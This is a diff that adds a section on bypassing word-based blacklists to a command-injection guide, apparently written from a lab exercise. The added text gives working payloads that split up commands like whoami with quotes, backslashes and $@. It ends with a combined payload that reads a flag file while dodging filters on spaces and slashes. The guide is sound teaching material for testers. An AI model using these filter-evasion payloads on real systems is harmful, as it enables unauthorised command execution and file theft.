@@ -11,6 +11,7 @@ This document summarizes core techniques for discovery and exploitation of **com
     - [Filter Evasion](#filter-evasion)
         - [Single Character Filters - Part 1](#single-character-filters---part-1)
         - [Single Character Filters - Part 2](#single-character-filters---part-2)
+        - [Word Filters - Part 1](#word-filters---part-1)
 
 
 ---
@@ -247,4 +248,85 @@ This demonstrates a fundamental weakness of blacklist-based filtering: even when
 
 ---
 
-### Word Filters
+### Word Filters - Part 1
+
+The techniques used to bypass blacklisted words differ from those used to bypass blacklisted characters. While character filters are often defeated by alternative encodings or shell metacharacters, word filters are typically bypassed through **obfuscation** — transforming a command so that it no longer matches a filtered keyword while still being interpreted correctly by the shell.
+
+In this section, we interact with an upgraded version of the web application from the previous examples. This version enforces the same character-based filters as before but additionally implements a word-based blacklist.
+
+When attempting to append a command after the newline injection operator, the application rejects the request:
+
+```bash
+ip=127.0.0.1%0awhoami
+```
+
+![Filtered output](images/word-filter.png)
+
+This indicates that the injected command itself (`whoami`) is being detected and blocked by the word filter.
+
+Many basic word filters rely on exact string matching. If a command is transformed such that it no longer appears as a contiguous string, it may bypass the filter. A common obfuscation technique involves inserting single or double quotes between characters of a command.
+
+Shells such as `bash` and `PowerShell` remove quotes during parsing, causing the command to be executed as if the quotes were not present.
+
+When using this technique, the following constraints apply:
+
+- Single and double quotes cannot be mixed
+- The total number of quotes must be even
+
+Examples of valid obfuscated commands include:
+
+```bash
+w'h'o'a'mi
+w'h'o'am'i
+
+w"h"o"a"mi
+w"h"o"am"i
+```
+
+Injecting these obfuscated commands bypasses the word filter and results in successful execution:
+
+```bash
+ip=127.0.0.1%0aw'h'o'am'i
+ip=127.0.0.1%0aw"h"o"am"i
+```
+
+![Filtered output](images/word-filter2.png)
+
+In addition to quotes, other shell features can be leveraged to break up filtered keywords.
+
+The backslash character (`\`) can be used to escape individual characters, and positional parameters such as `$@` can be inserted between characters without altering the final command after shell expansion.
+
+Examples include:
+
+```bash
+w\h\o\a\mi
+w\h\o\am\i
+
+who$@ami
+w$@h$@o$@am$@i
+```
+
+These obfuscated commands successfully bypass the word filter:
+
+```bash
+ip=127.0.0.1%0aw\h\o\a\mi
+ip=127.0.0.1%0awho$@ami
+```
+
+![Filtered output](images/word-filter3.png)
+
+Word obfuscation techniques can be combined with previously discussed character bypass methods to construct more complex payloads.
+
+For example, suppose we want to read the contents of `flag.txt` located in `/home/1nj3c70r`, while bypassing filters on command names, spaces, and slashes. The following payload reconstructs each restricted element dynamically:
+
+```bash
+ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
+```
+
+![Filtered output](images/word-filter4.png)
+
+Word-based blacklists are highly susceptible to evasion through shell parsing and expansion. As long as user input is evaluated by a shell interpreter, attackers can often transform filtered keywords into semantically equivalent forms that evade exact-match detection.
+
+---
+
+### Word Filters - Part 2
